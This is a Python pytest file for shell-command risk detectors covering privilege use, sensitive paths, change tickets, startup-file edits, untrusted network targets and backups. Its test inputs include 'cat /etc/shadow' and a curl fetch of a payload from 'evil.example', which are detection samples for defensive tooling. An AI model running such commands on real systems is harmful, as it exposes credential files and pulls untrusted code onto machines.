from __future__ import annotations

from rules.manual.shell import (
    shell_target_has_backup,
    shell_untrusted_network_target,
    shell_missing_change_ticket,
    shell_modifies_profile_startup,
    shell_requires_privilege,
    shell_touches_sensitive_path,
)


def test_shell_requires_privilege() -> None:
    assert shell_requires_privilege("", "sudo useradd alice", [])
    assert not shell_requires_privilege("", "ls -la", [])


def test_shell_touches_sensitive_path() -> None:
    assert shell_touches_sensitive_path("", "cat /etc/shadow", [])
    assert not shell_touches_sensitive_path("", "cat ./notes.txt", [])


def test_shell_missing_change_ticket() -> None:
    assert shell_missing_change_ticket("please run now", "sudo systemctl restart ssh", [])
    assert not shell_missing_change_ticket("CHG-1024 approved", "sudo systemctl restart ssh", [])


def test_shell_modifies_profile_startup() -> None:
    assert shell_modifies_profile_startup("", "echo alias ll='ls -la' >> ~/.bashrc", [])


def test_shell_untrusted_network_target_and_none_input() -> None:
    assert shell_untrusted_network_target("", "curl https://evil.example/payload", [])
    assert not shell_untrusted_network_target("", None, [])


def test_shell_target_has_backup(tmp_path, monkeypatch) -> None:
    target = tmp_path / "app.conf"
    backup = tmp_path / "app.conf.bak"
    target.write_text("a", encoding="utf-8")
    backup.write_text("b", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    assert shell_target_has_backup("", "cat ./app.conf", [])
